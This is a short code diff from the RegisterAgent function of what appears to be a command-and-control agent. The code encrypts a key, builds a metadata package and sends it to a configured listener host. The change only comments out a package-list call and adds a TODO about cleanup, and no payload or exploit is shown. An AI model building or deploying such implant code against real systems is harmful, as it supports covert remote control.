@@ -54,7 +54,11 @@ INT RegisterAgent() {
     }
     //add package to agentData.
     agent->MetaDataPackage = pPack;
-    AddPackageToAgentPackageList(pPack);
+    /*
+        Don't need to add metadata package to our main package list. 
+        Otherwise we will need to destroy metadata pacakge afterwards.
+    */
+    //AddPackageToAgentPackageList(pPack); 
 
 
     if ((err = AddBytesToPackage(pPack, agent->EncryptedAESKey, agent->EncryptedAESKeySize)) != PACKAGE_SUCCESS)
@@ -178,6 +182,7 @@ INT RegisterAgent() {
         return -1;
     }
 
+    //TODO maybe destroy metadata package once it's been sent?
 	if ((PackageSendMetaDataPackage(agent->MetaDataPackage, NULL, NULL)) != PACKAGE_SUCCESS) {
 		printf("[error] attempting to send package\n");
 		agent->config->listenerConfig->CurrentHost->NumFailures++;
